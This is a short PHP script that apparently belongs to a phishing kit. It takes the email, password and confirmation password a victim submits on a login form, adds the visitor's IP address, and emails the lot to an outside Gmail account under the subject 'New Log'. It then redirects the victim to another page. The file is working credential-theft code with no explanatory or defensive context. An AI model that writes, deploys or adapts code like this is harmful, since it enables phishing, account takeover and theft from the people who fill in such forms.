<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['up_email']."\n";
$message .= " Password : ".$_POST['up__X_PASSWORD']."\n";
$message .= "confirm password : ".$_POST['Password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY Machine-----------\n";
$send = "2016logs243@gmail.com";
$subject = "--New Log $ip ";


mail($send,$subject,$message,$headers);


$redirect = "forehead.html";

header("Location: " . $redirect);
 
?>